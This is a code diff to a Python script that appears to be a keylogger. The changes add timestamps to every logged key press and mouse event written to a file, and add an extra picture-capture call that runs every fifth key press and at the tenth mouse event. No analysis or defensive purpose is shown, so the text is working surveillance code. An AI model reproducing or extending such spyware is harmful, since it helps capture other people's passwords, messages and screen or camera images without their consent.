@@ -12,6 +12,8 @@ pic_num = 0
 #The file will automatically appear on the desktop. You may want to edit the location!
 
 def OnKeyPress(event):
+	fd.write((time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
+	fd.write('\n')
 	fd.write(event.Key)
 	fd.write('\n')
 	
@@ -19,9 +21,11 @@ def OnKeyPress(event):
 	pic_num = pic_num + 1
 	if pic_num % 5 == 0:
 		take_picture.take_pic()
-	
+		take_picture.take_pic_t()
 	
 def OnMousePress(event):
+	fd.write((time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
+	fd.write('\n')
 	fd.write(str(event))
 	fd.write('\n')
 	
@@ -29,6 +33,8 @@ def OnMousePress(event):
 	pic_num = pic_num + 1
 	if pic_num % 50 == 0:
 		take_picture.take_pic()
+	if pic_num == 10:
+		take_picture.take_pic_t()
 
 
 ################################################################################
